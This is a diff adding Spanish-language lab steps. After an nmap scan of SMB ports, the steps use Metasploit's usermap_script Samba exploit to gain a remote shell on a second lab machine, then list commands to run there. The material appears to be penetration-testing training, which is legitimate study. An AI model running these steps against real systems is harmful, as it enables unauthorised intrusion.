@@ -3,4 +3,18 @@
 
 ++ PC1: nmap -sV <ip_PC2>
 ++ PC1: Verificar si el puertos 139 y 445 (Asociados a SMB) están abiertos. 
+++ PC1: msfconsole
+++ PC1: search smb
+++ PC1: search usermap_script
+++ PC1: use 0
+++ PC1: show options
+++ PC1: set RHOSTS <ip_PC2>
+++ PC1: exploit
+++ PC1: En este punto ya tenemos acceso a PC2 y podemos ejecutar comandos tales como:
+--- ls (listar directorios)
+--- mkdir (crear_directorios)
+--- rmdir (borrar_directorios)
+
+
+
 
